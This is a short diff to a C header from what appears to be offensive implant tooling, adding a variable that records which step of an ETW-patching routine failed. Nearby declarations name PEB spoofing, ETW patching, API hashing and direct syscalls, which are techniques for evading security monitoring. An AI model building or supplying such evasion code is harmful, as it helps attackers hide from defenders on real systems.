@@ -17,6 +17,9 @@ void Opsec_SpoofPeb(const wchar_t* fakePath);
  * Must be called after ApiHashing_InitHashes() and Syscalls_Init(). */
 BOOL Opsec_PatchEtw(void);
 
+/* Populated by Opsec_PatchEtw: 1..4 identifies which step failed, 0 on success. */
+extern DWORD g_EtwFailStep;
+
 #ifdef __cplusplus
 }
 #endif
